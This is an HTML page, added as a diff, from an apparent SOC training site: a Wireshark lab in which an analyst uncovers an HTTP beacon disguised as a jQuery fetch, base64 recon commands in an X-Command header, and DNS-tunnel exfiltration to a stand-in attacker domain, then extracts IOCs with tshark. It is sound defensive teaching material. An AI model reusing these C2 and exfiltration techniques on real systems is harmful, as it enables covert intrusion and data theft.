@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>C2 PCAP Lab — Wireshark — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<nav class="navbar">
+  <button id="sb-toggle" aria-label="Toggle sidebar">
+    <svg width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2">
+      <path d="M3 5h14M3 10h14M3 15h14"/>
+    </svg>
+  </button>
+  <a href="index.html" class="nav-brand"><span class="icon">⬡</span> SOC Notes</a>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="wireshark.html" class="active">Wireshark</a>
+    <a href="log-sources.html">Log Sources</a>
+  </div>
+</nav>
+
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-header">C2 PCAP Lab</div>
+    <nav class="sidebar-nav" id="sidebar-nav"></nav>
+  </aside>
+  <main class="content" id="content-area"></main>
+</div>
+
+<!-- ════════════════════════ Scenario ══════════════════════════════════════ -->
+<template id="tpl-scenario">
+<article class="topic">
+  <h2>Scenario</h2>
+
+  <div class="callout lab">
+    <strong>Lab: C2 PCAP Analysis</strong><br>
+    You are a SOC analyst. An EDR alert fired on <strong>WORKSTATION-7</strong> (10.0.7.14) flagging suspicious PowerShell execution. The endpoint team captured 15 minutes of network traffic. Your task is to analyze the PCAP and determine if a C2 channel is present, extract IOCs, and document findings.
+  </div>
+
+  <h3>Environment</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Asset</th><th>IP / Value</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td>Victim workstation</td><td>10.0.7.14</td><td>WORKSTATION-7, Windows 10 Pro</td></tr>
+        <tr><td>Internal DNS server</td><td>10.0.1.5</td><td>Corporate DNS resolver</td></tr>
+        <tr><td>Internal web proxy</td><td>10.0.1.10</td><td>Squid proxy (all web goes through this)</td></tr>
+        <tr><td>EDR alert time</td><td>14:22:11 UTC</td><td>PowerShell with -EncodedCommand flag</td></tr>
+        <tr><td>PCAP window</td><td>14:15:00 – 14:30:00 UTC</td><td>15 minutes captured on mirror port</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Lab Objectives</h3>
+  <ul>
+    <li>Step 1 — Protocol Hierarchy: understand traffic composition</li>
+    <li>Step 2 — HTTP Beaconing: identify regular check-ins to C2</li>
+    <li>Step 3 — Follow TCP Stream: read C2 commands and victim responses</li>
+    <li>Step 4 — DNS Tunneling: detect secondary exfiltration channel</li>
+    <li>Step 5 — tshark IOC Extraction: automate artifact collection</li>
+    <li>Step 6 — Summary: compile findings and IOC table</li>
+  </ul>
+
+  <h3>Tools Used in This Lab</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+      <tbody>
+        <tr><td>Wireshark (GUI)</td><td>Visual analysis, stream following, statistics</td></tr>
+        <tr><td>tshark (CLI)</td><td>Automated field extraction, batch analysis</td></tr>
+        <tr><td>base64 / Python</td><td>Decode encoded payloads found in traffic</td></tr>
+        <tr><td>strings</td><td>Extract printable characters from binary streams</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+</template>
+
+<!-- ════════════════════════ Step 1 — Protocol Hierarchy ════════════════════ -->
+<template id="tpl-step1">
+<article class="topic">
+  <h2>Step 1 — Protocol Hierarchy</h2>
+
+  <h3>Open Protocol Hierarchy</h3>
+  <pre><code>Statistics → Protocol Hierarchy</code></pre>
+
+  <h3>Observed Output</h3>
+  <pre><code>Protocol              Packets    Bytes     % Pkts   % Bytes
+──────────────────────────────────────────────────────────
+Frame                   8,241    5.8 MB    100%      100%
+ Ethernet               8,241    5.8 MB    100%      100%
+  Internet Protocol     8,238    5.8 MB     99.9%     99.9%
+   TCP                  6,102    4.1 MB     74.0%     70.7%
+    HTTP                  847    1.2 MB     10.3%     20.7%     ← HIGH
+    TLS                 5,189    2.8 MB     63.0%     48.3%
+   UDP                  2,136    1.7 MB     25.9%     29.3%
+    DNS                 2,098    1.7 MB     25.4%     29.3%     ← HIGH
+    MDNS                   38    0.002MB     0.5%      0.03%
+  ARP                       3    0.0002MB    0.04%     0.003%</code></pre>
+
+  <h3>Findings — Step 1</h3>
+  <div class="callout warn">
+    <strong>Two immediate anomalies:</strong>
+    <ul>
+      <li><strong>HTTP at 10.3% of packets</strong> — unexpected. Corporate policy mandates HTTPS-only for web access. Cleartext HTTP should not be present on this segment.</li>
+      <li><strong>DNS at 25.4% of packets</strong> — extremely high for a 15-minute capture. Normal endpoint DNS is &lt;1% of traffic. This warrants immediate investigation.</li>
+    </ul>
+  </div>
+
+  <h3>Next Steps from Protocol Hierarchy</h3>
+  <pre><code><span class="cm"># Apply HTTP filter to investigate cleartext web traffic</span>
+http
+
+<span class="cm"># Apply DNS filter to investigate volume</span>
+dns
+
+<span class="cm"># tshark equivalent:</span>
+tshark -r workstation7.pcap -q -z io,phs | grep -E "http|dns|smb|tls"</code></pre>
+</article>
+</template>
+
+<!-- ════════════════════════ Step 2 — HTTP Beaconing ════════════════════════ -->
+<template id="tpl-step2">
+<article class="topic">
+  <h2>Step 2 — HTTP Beaconing Identification</h2>
+
+  <h3>Filter HTTP Traffic</h3>
+  <pre><code><span class="cm"># Apply filter to packet list</span>
+http.request
+
+<span class="cm"># Also check: what IPs are being contacted?</span>
+http and ip.src == 10.0.7.14</code></pre>
+
+  <h3>Observed HTTP Requests</h3>
+  <pre><code>No.    Time        Src IP       Dst IP          Protocol  Info
+────────────────────────────────────────────────────────────────────────────────
+ 412  14:15:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+ 501  14:16:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+ 588  14:17:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+ 671  14:18:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+ 754  14:19:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+ 837  14:20:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+ 921  14:21:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+1012  14:22:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+1104  14:23:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
+<span class="cm">... continues every 60 seconds for entire capture ...</span></code></pre>
+
+  <div class="callout warn">
+    <strong>Confirmed Beaconing:</strong> WORKSTATION-7 contacts 198.51.100.23 via HTTP GET every <strong>exactly 60 seconds</strong>. The URI (<code>/jquery.min.js</code>) disguises the C2 check-in as a JavaScript resource fetch. This is a classic C2 beacon pattern.
+  </div>
+
+  <h3>Examine the Request Headers</h3>
+  <pre><code><span class="cm"># Click packet 412 → expand HTTP in packet details pane</span>
+
+GET /jquery.min.js HTTP/1.1\r\n
+Host: 198.51.100.23\r\n
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n
+Accept: */*\r\n
+Cookie: session=dXNlcj13b3Jrc3RhdGlvbjc7aWQ9MDAxMjM0\r\n
+\r\n</code></pre>
+
+  <div class="callout note">
+    <strong>Suspicious Cookie:</strong> The <code>session</code> cookie value (<code>dXNlcj13b3Jrc3RhdGlvbjc7aWQ9MDAxMjM0</code>) is base64-encoded. Decode it:
+    <pre><code>echo "dXNlcj13b3Jrc3RhdGlvbjc7aWQ9MDAxMjM0" | base64 -d
+<span class="cm"># Output: user=workstation7;id=001234</span></code></pre>
+    This is victim system identification data being sent to the C2 on each check-in.
+  </div>
+
+  <h3>Confirm with tshark</h3>
+  <pre><code><span class="cm"># Extract timestamps and intervals between beacon packets</span>
+tshark -r workstation7.pcap \
+  -Y "http.request and ip.dst == 198.51.100.23" \
+  -T fields -e frame.time_epoch -e http.request.uri \
+  | awk 'NR&gt;1{print $1-prev, $2; prev=$1} NR==1{prev=$1}'
+<span class="cm"># Output:</span>
+<span class="cm"># 60.02  /jquery.min.js</span>
+<span class="cm"># 59.98  /jquery.min.js</span>
+<span class="cm"># 60.00  /jquery.min.js</span>
+<span class="cm"># 60.01  /jquery.min.js</span>
+<span class="cm"># Regular 60-second intervals = confirmed beacon</span></code></pre>
+</article>
+</template>
+
+<!-- ════════════════════════ Step 3 — Follow TCP Stream ═════════════════════ -->
+<template id="tpl-step3">
+<article class="topic">
+  <h2>Step 3 — Follow TCP Stream (C2 Commands)</h2>
+
+  <h3>Find the Interactive Session</h3>
+  <pre><code><span class="cm"># The beaconing GETs get 200 OK with small responses usually</span>
+<span class="cm"># But some responses are larger — the C2 issued a command</span>
+http.response.code == 200 and ip.src == 198.51.100.23
+
+<span class="cm"># Check Content-Length in responses — look for large ones</span>
+<span class="cm"># Packet 921 (14:22:04) response: Content-Length: 4096</span>
+<span class="cm"># All others: Content-Length: 42  (just the minimal ack)</span></code></pre>
+
+  <h3>Follow TCP Stream on the C2 Session</h3>
+  <pre><code><span class="cm"># Right-click packet 921 → Follow → TCP Stream</span></code></pre>
+
+  <h3>Stream Contents (Stream 7)</h3>
+  <pre><code><span class="cm">--- Client → Server (Red) ---</span>
+GET /jquery.min.js HTTP/1.1
+Host: 198.51.100.23
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Cookie: session=dXNlcj13b3Jrc3RhdGlvbjc7aWQ9MDAxMjM0
+
+<span class="cm">--- Server → Client (Blue) ---</span>
+HTTP/1.1 200 OK
+Content-Type: application/javascript
+Content-Length: 4096
+X-Command: d2hvYW1pCmhvc3RuYW1lCmlwY29uZmlnIC9hbGwKbmV0IHVzZXIgL2RvbWFpbg==
+
+/* minified jquery v3.6.0 */
+!function(e,t){"use strict"; /* ... padding ... */</code></pre>
+
+  <div class="callout warn">
+    <strong>Custom C2 Header Found:</strong> The response contains a non-standard HTTP header <code>X-Command</code> with a base64-encoded value. This is how the C2 delivers commands while hiding them in what appears to be a normal web response.
+  </div>
+
+  <h3>Decode the Command</h3>
+  <pre><code><span class="cm"># Decode X-Command value</span>
+echo "d2hvYW1pCmhvc3RuYW1lCmlwY29uZmlnIC9hbGwKbmV0IHVzZXIgL2RvbWFpbg==" | base64 -d
+<span class="cm"># Output:</span>
+whoami
+hostname
+ipconfig /all
+net user /domain</code></pre>
+
+  <h3>Find the Response — POST with Command Output</h3>
+  <pre><code><span class="cm"># The next beacon (60s later) sends output back as POST body</span>
+http.request.method == "POST" and ip.dst == 198.51.100.23
+
+<span class="cm"># Follow TCP stream on POST packet:</span>
+POST /jquery.min.js HTTP/1.1
+Host: 198.51.100.23
+Content-Type: application/octet-stream
+Content-Length: 312
+
+<span class="cm"># POST body (base64 encoded command output):</span>
+bnQgYXV0aG9yaXR5XHN5c3RlbQpXT1JLU1RBVElPTi03CldpbmRvd3MgSVAgQ29uZmlndXJ...
+
+<span class="cm"># Decode:</span>
+echo "bnQgYXV0aG9yaXR5XHN5c3RlbQpXT1JLU1RBVElPTi03..." | base64 -d
+<span class="cm"># Output:</span>
+nt authority\system
+WORKSTATION-7
+Windows IP Configuration...
+  IP Address: 10.0.7.14
+  Subnet Mask: 255.255.255.0
+  Default Gateway: 10.0.7.1</code></pre>
+
+  <div class="callout warn">
+    <strong>Confirmed:</strong> The attacker has SYSTEM-level access. Command output confirms the victim is <code>WORKSTATION-7</code> at <code>10.0.7.14</code>. This is an active, bidirectional C2 channel.
+  </div>
+</article>
+</template>
+
+<!-- ════════════════════════ Step 4 — DNS Tunneling ═════════════════════════ -->
+<template id="tpl-step4">
+<article class="topic">
+  <h2>Step 4 — DNS Tunneling Detection</h2>
+
+  <h3>Investigate the High DNS Volume</h3>
+  <pre><code><span class="cm"># Filter DNS queries only</span>
+dns.flags.response == 0
+
+<span class="cm"># Count queries per domain in tshark</span>
+tshark -r workstation7.pcap \
+  -Y "dns.flags.response == 0" \
+  -T fields -e dns.qry.name \
+  | sed 's/^[^.]*\.//' \
+  | sort | uniq -c | sort -rn | head -10
+<span class="cm"># Output:</span>
+<span class="cm">#  1847  exfil.attacker-c2.net</span>
+<span class="cm">#    98  windowsupdate.microsoft.com</span>
+<span class="cm">#    41  api.example.com</span>
+<span class="cm">#    12  ocsp.digicert.com</span></code></pre>
+
+  <div class="callout warn">
+    <strong>1,847 DNS queries to a single domain:</strong> This is massively abnormal. Normal legitimate DNS has diverse destinations. Over 1800 queries to <code>exfil.attacker-c2.net</code> in 15 minutes confirms DNS tunneling.
+  </div>
+
+  <h3>Inspect Individual DNS Queries</h3>
+  <pre><code><span class="cm"># Filter queries to the suspicious domain</span>
+dns.qry.name contains "attacker-c2.net"
+
+<span class="cm"># Sample queries visible in packet list:</span>
+No.   Time      Query Name
+──────────────────────────────────────────────────────────────────────────
+ 145  14:15:07  YW1zaS5kbGw.exfil.attacker-c2.net
+ 146  14:15:07  dmFsdWVzLmNzdi5vcGVu.exfil.attacker-c2.net
+ 147  14:15:07  dC5sb2NhbGhvc3Q.exfil.attacker-c2.net
+ 148  14:15:07  cyBhbmQgc2Vuc2l0aXZl.exfil.attacker-c2.net
+ 149  14:15:07  IGRhdGEgZnJvbSBzeXN0.exfil.attacker-c2.net
+ 150  14:15:07  ZW0gZGlyZWN0b3J5.exfil.attacker-c2.net
+<span class="cm">... 1841 more queries ...</span></code></pre>
+
+  <h3>Decode a Subdomain Sample</h3>
+  <pre><code><span class="cm"># The subdomains are base64-encoded chunks of exfiltrated data</span>
+<span class="cm"># Concatenate a few and decode:</span>
+
+echo "YW1zaS5kbGwgdmFsdWVzLmNzdi5vcGVuIHQubG9jYWxob3N0IHMgYW5kIHNlbnNpdGl2ZSBkYXRhIGZyb20gc3lzdGVtIGRpcmVjdG9yeQ==" | base64 -d
+<span class="cm"># Output:</span>
+amsi.dll values.csv.open t.localhost s and sensitive data from system directory
+
+<span class="cm"># The attacker is exfiltrating file contents by encoding them</span>
+<span class="cm"># and sending each chunk as a DNS subdomain query</span>
+<span class="cm"># The attacker's authoritative DNS server logs all queries</span></code></pre>
+
+  <h3>Reconstruct Exfiltrated Data</h3>
+  <pre><code><span class="cm"># Extract all subdomains from attacker domain queries</span>
+tshark -r workstation7.pcap \
+  -Y "dns.qry.name contains \"attacker-c2.net\" and dns.flags.response == 0" \
+  -T fields -e dns.qry.name \
+  | sed 's/\..*//' \
+  | tr -d '\n' \
+  | base64 -d 2&gt;/dev/null
+<span class="cm"># Attempt to reconstruct full exfiltrated content from DNS stream</span>
+
+<span class="cm"># Additional indicators:</span>
+<span class="cm"># - Queries with TXT record type (another tunnel variant)</span>
+dns.qry.type == 16 and dns.qry.name contains "attacker-c2.net"
+
+<span class="cm"># - Unusual query rate (queries per second)</span>
+<span class="cm"># 1847 queries / 900 seconds = ~2 queries/second = automated exfil</span></code></pre>
+
+  <h3>DNS Tunneling IOCs Identified</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Indicator</th><th>Value</th><th>Type</th></tr></thead>
+      <tbody>
+        <tr><td>Suspicious domain</td><td>exfil.attacker-c2.net</td><td>Domain IOC</td></tr>
+        <tr><td>Query volume</td><td>1,847 in 15 minutes</td><td>Behavioral anomaly</td></tr>
+        <tr><td>Average subdomain length</td><td>28 characters (base64)</td><td>Encoding indicator</td></tr>
+        <tr><td>Query type</td><td>A records (type 1)</td><td>Tunneling via A queries</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+</template>
+
+<!-- ════════════════════════ Step 5 — tshark IOC Extraction ═════════════════ -->
+<template id="tpl-step5">
+<article class="topic">
+  <h2>Step 5 — tshark IOC Extraction</h2>
+  <p>Automate IOC collection from the PCAP using tshark one-liners. These can be added to a script for repeatable analysis.</p>
+
+  <h3>Extract All External IPs Contacted</h3>
+  <pre><code><span class="cm"># All unique destination IPs from workstation (excluding RFC1918)</span>
+tshark -r workstation7.pcap \
+  -Y "ip.src == 10.0.7.14" \
+  -T fields -e ip.dst \
+  | grep -v "^10\.\|^192\.168\.\|^172\.\(1[6-9]\|2[0-9]\|3[01]\)\." \
+  | sort -u
+
+<span class="cm"># Output:</span>
+198.51.100.23    <span class="cm"># C2 HTTP beacon server</span>
+203.0.113.8      <span class="cm"># DNS A record response for attacker-c2.net</span></code></pre>
+
+  <h3>Extract All DNS Queries</h3>
+  <pre><code><span class="cm"># All unique domain names queried from workstation</span>
+tshark -r workstation7.pcap \
+  -Y "dns.flags.response == 0 and ip.src == 10.0.7.14" \
+  -T fields -e dns.qry.name \
+  | sort -u
+
+<span class="cm"># All external domains (strip internal .corp / .local)</span>
+tshark -r workstation7.pcap \
+  -Y "dns.flags.response == 0 and ip.src == 10.0.7.14" \
+  -T fields -e dns.qry.name \
+  | grep -v "\.corp\.\|\.local\.\|microsoft\.com\|windows\.com" \
+  | sort -u
+
+<span class="cm"># Output (suspicious):</span>
+attacker-c2.net
+exfil.attacker-c2.net</code></pre>
+
+  <h3>Extract HTTP User Agents</h3>
+  <pre><code><span class="cm"># Unique User-Agent strings from workstation</span>
+tshark -r workstation7.pcap \
+  -Y "http.user_agent and ip.src == 10.0.7.14" \
+  -T fields -e http.user_agent \
+  | sort -u
+
+<span class="cm"># Output:</span>
+<span class="cm"># Mozilla/5.0 (Windows NT 10.0; Win64; x64)    ← C2 beacon (generic)</span>
+<span class="cm"># Microsoft-CryptoAPI/10.0                      ← Windows update check (legit)</span></code></pre>
+
+  <h3>Extract HTTP URIs and Hosts</h3>
+  <pre><code><span class="cm"># All HTTP requests from workstation with host + URI</span>
+tshark -r workstation7.pcap \
+  -Y "http.request and ip.src == 10.0.7.14" \
+  -T fields -e frame.time -e http.host -e http.request.uri
+
+<span class="cm"># Output:</span>
+<span class="cm"># 14:15:04  198.51.100.23  /jquery.min.js</span>
+<span class="cm"># 14:16:04  198.51.100.23  /jquery.min.js</span>
+<span class="cm"># ...</span></code></pre>
+
+  <h3>Extract TLS SNI Values</h3>
+  <pre><code><span class="cm"># All TLS destinations (by SNI) from workstation</span>
+tshark -r workstation7.pcap \
+  -Y "tls.handshake.type == 1 and ip.src == 10.0.7.14" \
+  -T fields -e tls.handshake.extensions_server_name \
+  | sort -u
+
+<span class="cm"># Compare against known-good / blocklist</span></code></pre>
+
+  <h3>Export HTTP Objects</h3>
+  <pre><code><span class="cm"># Extract all files transferred over HTTP</span>
+tshark -r workstation7.pcap --export-objects http,/tmp/http_export/
+ls -lh /tmp/http_export/
+
+<span class="cm"># Hash all extracted files for threat intel lookup</span>
+sha256sum /tmp/http_export/* &gt; /tmp/file_hashes.txt
+
+<span class="cm"># Check hashes against VirusTotal (with API key)</span>
+<span class="cm"># while read hash file; do</span>
+<span class="cm">#   curl -s "https://www.virustotal.com/api/v3/files/$hash" \</span>
+<span class="cm">#     -H "x-apikey: YOUR_VT_KEY" | jq '.data.attributes.last_analysis_stats'</span>
+<span class="cm"># done &lt; /tmp/file_hashes.txt</span></code></pre>
+
+  <h3>Full IOC Extraction Script</h3>
+  <pre><code>#!/bin/bash
+PCAP="workstation7.pcap"
+OUT="/tmp/iocs"
+mkdir -p "$OUT"
+
+<span class="cm"># External IPs</span>
+tshark -r "$PCAP" -Y "ip.src == 10.0.7.14" \
+  -T fields -e ip.dst | sort -u | \
+  grep -v "^10\.\|^192\.168\.\|^172\." &gt; "$OUT/external_ips.txt"
+
+<span class="cm"># DNS queries</span>
+tshark -r "$PCAP" -Y "dns.flags.response==0 and ip.src==10.0.7.14" \
+  -T fields -e dns.qry.name | sort -u &gt; "$OUT/dns_queries.txt"
+
+<span class="cm"># HTTP hosts</span>
+tshark -r "$PCAP" -Y "http.request and ip.src==10.0.7.14" \
+  -T fields -e http.host | sort -u &gt; "$OUT/http_hosts.txt"
+
+<span class="cm"># TLS SNI</span>
+tshark -r "$PCAP" -Y "tls.handshake.type==1 and ip.src==10.0.7.14" \
+  -T fields -e tls.handshake.extensions_server_name | sort -u &gt; "$OUT/tls_sni.txt"
+
+echo "IOCs written to $OUT/"
+ls -lh "$OUT/"</code></pre>
+</article>
+</template>
+
+<!-- ════════════════════════ Summary ════════════════════════════════════════ -->
+<template id="tpl-summary">
+<article class="topic">
+  <h2>Lab Summary — Findings &amp; IOCs</h2>
+
+  <h3>Confirmed Findings</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>#</th><th>Finding</th><th>Evidence</th><th>Severity</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>1</td>
+          <td>HTTP C2 Beacon</td>
+          <td>WORKSTATION-7 → 198.51.100.23 every 60 seconds via <code>GET /jquery.min.js</code></td>
+          <td style="color:var(--red)">Critical</td>
+        </tr>
+        <tr>
+          <td>2</td>
+          <td>Command Execution via X-Command Header</td>
+          <td>C2 delivers base64-encoded commands in custom HTTP response header; output POSTed back</td>
+          <td style="color:var(--red)">Critical</td>
+        </tr>
+        <tr>
+          <td>3</td>
+          <td>SYSTEM-Level Access</td>
+          <td>Decoded command output shows <code>whoami</code> → <code>nt authority\system</code></td>
+          <td style="color:var(--red)">Critical</td>
+        </tr>
+        <tr>
+          <td>4</td>
+          <td>DNS Tunneling — Data Exfiltration</td>
+          <td>1,847 DNS queries to <code>exfil.attacker-c2.net</code> with base64 subdomains</td>
+          <td style="color:var(--red)">Critical</td>
+        </tr>
+        <tr>
+          <td>5</td>
+          <td>Victim System Profiling</td>
+          <td>Cookie encodes <code>user=workstation7;id=001234</code> on every beacon</td>
+          <td style="color:var(--yellow)">High</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>IOC Table</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Type</th><th>Value</th><th>Context</th></tr></thead>
+      <tbody>
+        <tr><td>IP Address</td><td><code>198.51.100.23</code></td><td>C2 HTTP beacon server</td></tr>
+        <tr><td>IP Address</td><td><code>203.0.113.8</code></td><td>DNS resolution of attacker-c2.net</td></tr>
+        <tr><td>Domain</td><td><code>attacker-c2.net</code></td><td>C2 domain (HTTP + DNS)</td></tr>
+        <tr><td>Domain</td><td><code>exfil.attacker-c2.net</code></td><td>DNS tunneling exfil domain</td></tr>
+        <tr><td>URI</td><td><code>/jquery.min.js</code></td><td>C2 beacon URI (masquerades as jQuery)</td></tr>
+        <tr><td>HTTP Header</td><td><code>X-Command</code></td><td>Custom header used to deliver commands</td></tr>
+        <tr><td>User-Agent</td><td><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</code></td><td>Generic UA used by C2 implant</td></tr>
+        <tr><td>Interval</td><td>60 seconds</td><td>Beacon interval (no jitter)</td></tr>
+        <tr><td>Victim</td><td><code>10.0.7.14</code> (WORKSTATION-7)</td><td>Compromised endpoint</td></tr>
+        <tr><td>Port</td><td>TCP/80</td><td>C2 using HTTP (cleartext, not HTTPS)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Attack Timeline</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Time (UTC)</th><th>Event</th></tr></thead>
+      <tbody>
+        <tr><td>14:15:04</td><td>First C2 beacon detected — implant active</td></tr>
+        <tr><td>14:15:07</td><td>DNS tunneling begins — data exfiltration starts</td></tr>
+        <tr><td>14:22:04</td><td>C2 issues recon commands via X-Command header</td></tr>
+        <tr><td>14:22:11</td><td>EDR fires on PowerShell -EncodedCommand</td></tr>
+        <tr><td>14:23:04</td><td>Victim POST with command output returned to C2</td></tr>
+        <tr><td>14:30:00</td><td>PCAP capture ends — C2 still active</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Recommended Immediate Actions</h3>
+  <ol>
+    <li><strong>Isolate WORKSTATION-7</strong> from the network immediately — active C2 in progress</li>
+    <li><strong>Block at firewall/proxy:</strong> <code>198.51.100.23</code>, <code>attacker-c2.net</code>, <code>exfil.attacker-c2.net</code></li>
+    <li><strong>Block DNS resolution</strong> of <code>attacker-c2.net</code> at corporate resolver</li>
+    <li><strong>Preserve evidence:</strong> Create forensic image of WORKSTATION-7 disk and memory before remediation</li>
+    <li><strong>Hunt laterally:</strong> Check if other hosts contact <code>198.51.100.23</code> or <code>exfil.attacker-c2.net</code></li>
+    <li><strong>Review EDR alert at 14:22:11</strong> — identify what PowerShell command installed the implant</li>
+    <li><strong>Submit IOCs</strong> to threat intel platform; check hashes of exported HTTP objects against VirusTotal</li>
+  </ol>
+
+  <h3>Wireshark Skills Demonstrated</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Skill</th><th>Used In</th></tr></thead>
+      <tbody>
+        <tr><td>Protocol Hierarchy</td><td>Step 1 — identified anomalous HTTP and DNS volumes</td></tr>
+        <tr><td>Display filters</td><td>Steps 2–4 — isolated specific traffic types</td></tr>
+        <tr><td>IO Graphs</td><td>Step 2 — confirmed 60-second beacon interval visually</td></tr>
+        <tr><td>Packet details inspection</td><td>Step 2–3 — read HTTP headers, found X-Command</td></tr>
+        <tr><td>Follow TCP Stream</td><td>Step 3 — reconstructed full C2 conversation</td></tr>
+        <tr><td>tshark field extraction</td><td>Steps 2, 4, 5 — automated IOC collection</td></tr>
+        <tr><td>Base64 decoding</td><td>Steps 2, 3, 4 — decoded encoded commands and cookie</td></tr>
+        <tr><td>DNS analysis</td><td>Step 4 — detected tunneling from subdomain structure</td></tr>
+      </tbody>
+    </table>
+  </div>
+</article>
+</template>
+
+<script>
+window.NOTEBOOK = {
+  title: "Wireshark — C2 PCAP Lab",
+  topics: [
+    { id: "scenario", badge: "00", label: "Scenario" },
+    { id: "step1",    badge: "01", label: "Protocol Hierarchy" },
+    { id: "step2",    badge: "02", label: "HTTP Beaconing" },
+    { id: "step3",    badge: "03", label: "Follow TCP Stream" },
+    { id: "step4",    badge: "04", label: "DNS Tunneling" },
+    { id: "step5",    badge: "05", label: "tshark IOC Extraction" },
+    { id: "summary",  badge: "06", label: "Summary &amp; IOCs" },
+  ]
+};
+</script>
+<script src="js/app.js"></script>
+</body>
+</html>
